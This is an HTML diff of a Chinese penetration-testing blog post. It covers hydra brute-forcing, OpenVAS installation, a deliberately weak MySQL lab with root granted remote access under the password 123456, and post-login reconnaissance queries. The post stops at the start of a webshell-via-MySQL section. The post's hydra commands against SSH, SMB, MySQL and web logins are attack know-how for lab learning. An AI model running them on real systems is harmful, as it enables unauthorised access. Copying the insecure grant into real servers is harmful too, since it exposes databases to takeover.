@@ -1,0 +1,1311 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="mysql弱密码,hydra,OpenVAS,webshell,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="BLOG of little potato" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/lypto.ico?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="hydra是一个基于字典的密码暴力破解工具，在kali里面集成，在其他发行版里也大都可以通过包管理器进行安装。它默认集成了很多常用的服务以及协议暴力枚举攻击载荷，在渗透测试中有举足轻重的作用。同样的，openvas是一个漏洞扫描器，真的是相当的强大，里面搜录了40多万个漏洞，包括CVE,NVD漏洞平台等，是Nessus项目分支并且开源，在mysql弱密码的漏洞的学习和自动化工具使用的过程中，被">
+<meta name="keywords" content="mysql弱密码,hydra,OpenVAS,webshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建">
+<meta property="og:url" content="http://yoursite.com/2018/08/14/mysql弱密码/index.html">
+<meta property="og:site_name" content="BLOG of little potato">
+<meta property="og:description" content="hydra是一个基于字典的密码暴力破解工具，在kali里面集成，在其他发行版里也大都可以通过包管理器进行安装。它默认集成了很多常用的服务以及协议暴力枚举攻击载荷，在渗透测试中有举足轻重的作用。同样的，openvas是一个漏洞扫描器，真的是相当的强大，里面搜录了40多万个漏洞，包括CVE,NVD漏洞平台等，是Nessus项目分支并且开源，在mysql弱密码的漏洞的学习和自动化工具使用的过程中，被">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/myimages/mysql弱密码登陆/mysql.png">
+<meta property="og:image" content="http://yoursite.com/myimages/mysql弱密码登陆/hydra.png">
+<meta property="og:image" content="http://yoursite.com/myimages/mysql弱密码登陆/scan.png">
+<meta property="og:image" content="http://yoursite.com/myimages/mysql弱密码登陆/result.png">
+<meta property="og:image" content="http://yoursite.com/myimages/mysql弱密码登陆/passwd.png">
+<meta property="og:updated_time" content="2018-12-05T15:13:13.393Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建">
+<meta name="twitter:description" content="hydra是一个基于字典的密码暴力破解工具，在kali里面集成，在其他发行版里也大都可以通过包管理器进行安装。它默认集成了很多常用的服务以及协议暴力枚举攻击载荷，在渗透测试中有举足轻重的作用。同样的，openvas是一个漏洞扫描器，真的是相当的强大，里面搜录了40多万个漏洞，包括CVE,NVD漏洞平台等，是Nessus项目分支并且开源，在mysql弱密码的漏洞的学习和自动化工具使用的过程中，被">
+<meta name="twitter:image" content="http://yoursite.com/myimages/mysql弱密码登陆/mysql.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":0,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/14/mysql弱密码/">
+
+
+
+
+
+  <title>hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建 | BLOG of little potato</title>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?47d7b880e7f466d86f6a2755e80a6337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BLOG of little potato</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/14/mysql弱密码/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="little potato">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/109.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BLOG of little potato">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-14T01:04:25+08:00">
+                Aug 14 2018
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/08/14/mysql弱密码/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/08/14/mysql弱密码/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img style="margin: auto;" src="/myimages/mysql弱密码登陆/mysql.png" height="350" width="350"></p>
+<blockquote>
+<p>hydra是一个基于字典的密码暴力破解工具，在kali里面集成，在其他发行版里也大都可以通过包管理器进行安装。它默认集成了很多常用的服务以及协议暴力枚举攻击载荷，在渗透测试中有举足轻重的作用。同样的，openvas是一个漏洞扫描器，真的是相当的强大，里面搜录了40多万个漏洞，包括CVE,NVD漏洞平台等，是Nessus项目分支并且开源，在mysql弱密码的漏洞的学习和自动化工具使用的过程中，被这两个工具深深安利到了，所以写下这篇文章，主要介绍工具的使用和安装过程。<br><a id="more"></a></p>
+</blockquote>
+<h1 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h1><p>hydra 这个工具的安装还是比较的友好，可以直接使用的包管理器。在日常的使用中，要注意收集一些比较好用的字典，或者根据渗透测试的信息搜集，生成一些比较有针对性的字典。</p>
+<p>hydra的强大体现在它支持的服务类型相当的多，集成化很高，并且使用接口很简单，目前支持的服务类型有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Asterisk,AFP,CiscoAAA,Ciscoauth,Ciscoenable,CVS,Firebird,FTP,HTTP-FORM-GET,HTTP-FORM-POST,</span><br><span class="line"></span><br><span class="line">HTTP-GET,HTTP-HEAD,HTTP-POST,HTTP-PROXY,HTTPS-FORM-GET,HTTPS-FORM-POST,HTTPS-GET,HTTPS-POST,HTTPS-HEAD,</span><br><span class="line"></span><br><span class="line">HTTP-Proxy,ICQ,IMAP,IRC,LDAP,MS-SQL,MYSQL,NCP,NNTP,OracleListener,OracleSID,Oracle,</span><br><span class="line"></span><br><span class="line">PC-Anywhere,PCNFS,POP3,POSTGRES,RDP,Rexec,Rlogin,Rsh,RTSP,S7-300,SAP/R3,SIP,SMB,SMTP,</span><br><span class="line"></span><br><span class="line">SMTPEnum,SNMP,SOCKS5,SSH(v1andv2),Subversion,Teamspeak(TS2),Telnet,VMware-Auth,VNCandXMPP.</span><br></pre></td></tr></table></figure></p>
+<h3 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]</span><br><span class="line">[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</span><br><span class="line"></span><br><span class="line">-R 继续从上一次进度接着破解。</span><br><span class="line">-S 采用SSL链接。</span><br><span class="line">-s PORT 可通过这个参数指定非默认端口。</span><br><span class="line">-l LOGIN 指定破解的用户，对特定用户破解。</span><br><span class="line">-L FILE 指定用户名字典。</span><br><span class="line">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class="line">-P FILE 大写，指定密码字典。</span><br><span class="line">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span><br><span class="line">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</span><br><span class="line">-M FILE 指定目标列表文件一行一条。</span><br><span class="line">-o FILE 指定结果输出文件。</span><br><span class="line">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t TASKS 同时运行的线程数，默认为16。</span><br><span class="line">-w TIME 设置最大超时的时间，单位秒，默认是30s。</span><br><span class="line">-v / -V 显示详细过程。</span><br><span class="line">server 目标ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># hydra的使用十分简单，用得比较多的是-P，-p,-l,-L选项，常见的暴力破解命令举例：</span><br><span class="line"></span><br><span class="line">#破解ssh：</span><br><span class="line">hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.8 ssh</span><br><span class="line"></span><br><span class="line">#破解smb</span><br><span class="line"> hydra -l administrator -P pass.txt 10.36.16.18 smb</span><br><span class="line"> </span><br><span class="line">#破解mysql</span><br><span class="line">hydra  -l root –p pass.txt –e ns 127.0.0.1 mysql</span><br><span class="line"></span><br><span class="line">#破解post web登陆</span><br><span class="line">hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 关于hydra的代理使用,现在已经支持socks5,socks4,http,同时可以支持代理列表的方式，现在已经可以支持64个实体代理列表</span><br><span class="line">export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)</span><br><span class="line">export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)</span><br><span class="line">export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080</span><br><span class="line">export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)</span><br></pre></td></tr></table></figure>
+<h1 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h1><p>OpenVAS是开放式漏洞评估系统，Nessus项目分支，可以用来管理目标系统的漏洞，并且免费开源，在kali默认安装，但未配置和启动。它里面集成了现在比较大型的漏洞发布平台的数据库，并且可以实现自动化poc利用和漏洞探测，包括CVE，NVD等。</p>
+<p>这个工具的安装还是相当的繁琐的，涉及证书的导入，redis,sqlite3数据库的安装,还有漏洞数据库的更新，整个流程做下来还是相当的费时间的。在虚拟机的fedora里面体验了一把原生态的安装流程，真的是要吐血了，好在现在有docker这个神器，一切都是那么的优雅。所以现在记录一下fedora,kali,docker的安装流程。其实docker里的安装其实是基于ubuntu 16.04的镜像进行构建的，查看Dockerfile可以学习到ubuntu 16.04下的安装办法。</p>
+<h3 id="Kali-2-0"><a href="#Kali-2-0" class="headerlink" title="Kali 2.0"></a>Kali 2.0</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">apt-get -y install openvas</span><br><span class="line"></span><br><span class="line"># 启动流程，涉及证书导入，数据库启动，openvas进程启动等，有些费时</span><br><span class="line">openvas setup</span><br><span class="line"></span><br><span class="line"># 检擦安装版本8或者版本9的开启情况，现在的最新版本是版本9，这个脚本比较方便我们去判断到底openvas是否启动完成，如果有报错，我们可以根据日志文件和fix建议进行相关操作。</span><br><span class="line">openvas-check-setup [-v8]|[-v9] </span><br><span class="line">/*</span><br><span class="line">使用openvas-stop或openvas-start命令，将同时停止或启动OpenVAS服务中的三个程序，即Greenbone Security Assistant、OpenVAS Scanner和OpenVAS Manager。如果用户想要启动或停止单个服务时，可以使用service命令实现。</span><br><span class="line"></span><br><span class="line">9390为openvas 管理端端口</span><br><span class="line">9391 scanner扫描端口</span><br><span class="line">9392 web界面登录端口</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"># 获取/创建用户，并修改用户密码</span><br><span class="line">openvasmd --get-users</span><br><span class="line">sudo openvasmd --create-user=admin --role=Admin</span><br><span class="line">openvasmd --user=admin --new-password=123</span><br><span class="line"></span><br><span class="line"># openvas 版本升级</span><br><span class="line">openvas-feed-update</span><br></pre></td></tr></table></figure>
+<h3 id="fedora"><a href="#fedora" class="headerlink" title="fedora"></a>fedora</h3><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#关闭selinux</span><br><span class="line">vim /etc/selinux/config </span><br><span class="line">#将SELINUX=enforcing改为SELINUX=disabled,重启机器即可</span><br><span class="line"></span><br><span class="line"># 更新</span><br><span class="line">sudo dnf update</span><br><span class="line"></span><br><span class="line">#安装openvas</span><br><span class="line">sudo dnf install openvas*</span><br><span class="line"></span><br><span class="line">#安装redis</span><br><span class="line">sudo dnf install redis* -y</span><br><span class="line"></span><br><span class="line">#安装sqlite3</span><br><span class="line">sudo dnf install sqlite3* -y</span><br><span class="line"></span><br><span class="line">#安装证书生成工具</span><br><span class="line">sudo dnf guntls-utils</span><br><span class="line"></span><br><span class="line">#编辑redis配置文件，删除以下前导符‘#’</span><br><span class="line"># unixsocket /tmp/redis.sock</span><br><span class="line"># unixsocketperm 700</span><br><span class="line"></span><br><span class="line">#后台启动redis</span><br><span class="line">sudo redis-server /etc/redis.conf&amp;</span><br><span class="line"></span><br><span class="line">#检擦启动情况</span><br><span class="line">openvas-check-setup [-v8]|[-v9] </span><br><span class="line"></span><br><span class="line">#同步nvt库</span><br><span class="line">sudo greenbone-nvt-sync</span><br><span class="line"></span><br><span class="line">#建立同步本地scapdata数据库</span><br><span class="line">sudo greenbone-scapdate-sync</span><br><span class="line"></span><br><span class="line">#获取证书</span><br><span class="line">sudo greenbone-certdata-sync</span><br><span class="line"></span><br><span class="line">#递归创建需要的目录</span><br><span class="line">sudo mkdir -p /var/lib/openvas/openvasmd/gnupg</span><br><span class="line"></span><br><span class="line">#启动scanner</span><br><span class="line">sudo openvassd</span><br><span class="line"></span><br><span class="line">#重建数据库,耗时较久</span><br><span class="line">sudo openvasmd --rebuild</span><br><span class="line"></span><br><span class="line">#创建用户和修改密码</span><br><span class="line">sudo openvasmd --create-user=admin --role=Admin</span><br><span class="line">openvasmd --user=admin --new-password=password</span><br><span class="line"></span><br><span class="line">#生成证书</span><br><span class="line">sudo openvas-manage-cert -a</span><br><span class="line"></span><br><span class="line">#启动gsad(greenbone security assistant),设置端口信息</span><br><span class="line">sudo gsad --listen=127.0.0.1 --port=9392 </span><br><span class="line"></span><br><span class="line">#启动openvasd</span><br><span class="line">sudo openvasd</span><br></pre></td></tr></table></figure>
+<h6 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo redis-server /etc/redis.conf &amp;</span><br><span class="line">sudo openvassd</span><br><span class="line">sudo openvasmd</span><br><span class="line">sudo gsad --listen=127.0.0.1 --port=9392</span><br></pre></td></tr></table></figure>
+<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 搜索镜像</span><br><span class="line">docker search openvas</span><br><span class="line">#选择排名最高的</span><br><span class="line">docker pull mikesplain/openvas:9</span><br><span class="line">#限制cpu和内存，以deamon方式启动镜像</span><br><span class="line">docker run --cpuset-cpus=2 -m 2048M -d -p 443:443 --name openvas mikesplain/openvas:9</span><br><span class="line">#浏览器访问：https://localhost,登陆用户名/密码为：admin/admin，enjoy!</span><br></pre></td></tr></table></figure>
+<h1 id="mysql弱密码环境配置"><a href="#mysql弱密码环境配置" class="headerlink" title="mysql弱密码环境配置"></a>mysql弱密码环境配置</h1><p>搭建好<code>lamp</code>后开始进行修改配置</p>
+<h3 id="mysql设置远程访问"><a href="#mysql设置远程访问" class="headerlink" title="mysql设置远程访问"></a>mysql设置远程访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 修改配置文件和设置远程访问运行，以root用户为例</span><br><span class="line"></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION;# 把所有权限赋予root用户,并让root用户拥有分配这些权限的权利，同时设置登陆密码为123456，同时接受任何远程主机的连接</span><br><span class="line">FLUSH PRIVILEGES  #刷新权限表</span><br><span class="line"></span><br><span class="line">体外话：</span><br><span class="line"># 假设要给lypto用户在192.168.1.100的内网机器访问的权限，则</span><br><span class="line">//GRANT ALL PRIVILEGES ON *.* TO &apos;lypto&apos;@’192.168.1.100’ IDENTIFIED BY &apos;654321&apos; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure>
+<h3 id="iptables-端口放行"><a href="#iptables-端口放行" class="headerlink" title="iptables 端口放行"></a>iptables 端口放行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 3306 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -P tcp --sport 3306 -j ACCEPT</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>为了减少爆破难度和速度，mysql远程登陆的密码设置为123456，并且自制字典仅包含两项wearefamily,123456,尝试爆破</p>
+<p><img src="/myimages/mysql弱密码登陆/hydra.png" alt="image"></p>
+<h3 id="OpenVAS扫描"><a href="#OpenVAS扫描" class="headerlink" title="OpenVAS扫描"></a>OpenVAS扫描</h3><p><img src="/myimages/mysql弱密码登陆/scan.png" alt="image"></p>
+<p><img src="/myimages/mysql弱密码登陆/result.png" alt="image"></p>
+<p><img src="/myimages/mysql弱密码登陆/passwd.png" alt="image"></p>
+<p>使用openvas进行扫描，设置参数的时候为了减少扫描时间，可以设置只扫描3306端口，尽管这样，因为是虚拟机里面运行，所以比较慢，最后结果比较理想，不仅仅返回了mysql弱密码的9.0以上的高危漏洞评级，而且在漏洞细节里面还爆破出了密码：123456</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="登陆mysql后参数查看与信息搜集"><a href="#登陆mysql后参数查看与信息搜集" class="headerlink" title="登陆mysql后参数查看与信息搜集"></a>登陆mysql后参数查看与信息搜集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br><span class="line">select @@version;</span><br><span class="line">select current_user();</span><br><span class="line">select user();</span><br><span class="line">select database();</span><br><span class="line">select @@version_compile_os;</span><br><span class="line">select @@basedir;</span><br><span class="line"># 默认值 5.7.20-0ubuntu0.16.04.1 /usr/ </span><br><span class="line">select @@datadir;</span><br><span class="line"># 默认值 5.7.20-0ubuntu0.16.04.1 /var/lib/mysql/</span><br><span class="line">select @@plugin_dir; </span><br><span class="line"># 默认值 5.7.20-0ubuntu0.16.04.1 /usr/lib/mysql/plugin/</span><br><span class="line">select @@secure_file_priv</span><br><span class="line"># 默认值 5.7.20-0ubuntu0.16.04.1 /var/lib/mysql-files/</span><br><span class="line">SHOW VARIABLES LIKE  &quot;secure_file_priv&quot;;</span><br><span class="line">SELECT @@global.secure_file_priv;</span><br><span class="line">show variables like &apos;%general%&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="mysql文件操作传shell"><a href="#mysql文件操作传shell" class="headerlink" title="mysql文件操作传shell"></a>mysql文件操作传shell</h3><p><code>secure_file_priv</code> mysql的一个全局只读变量,即使是root用户也没有办法对其进行运行时修改。用于限制数据的导入导出，例如<code>load_file</code> 和<code>select … into outfile</code> 等。<br><code>mysql 5.5.53</code> 和以前的版本，默认值为空。允许导入导出。之后的版本默认为‘NULL’ ,禁用了导入导出功能。为了安全，不要设置为空。可以设置为NULL 或者 一个限制好权限的目录。</p>
